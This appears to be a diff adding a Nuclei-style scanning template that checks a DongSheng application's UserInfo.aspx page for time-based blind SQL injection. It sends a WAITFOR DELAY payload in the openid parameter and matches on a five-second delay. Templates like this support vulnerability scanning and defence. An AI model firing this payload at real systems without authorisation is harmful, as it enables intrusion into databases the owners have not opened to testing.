@@ -1,0 +1,26 @@
+id: DongSheng-UserInfo-sqlInjection
+info:
+  name: DongSheng-UserInfo-sqlInjection
+  author: iSee857
+  severity: high
+  description: DongSheng-UserInfo-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /Areas/Mobile/Views/Login/UserInfo.aspx?openid=1%27WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+         - "关联解除"
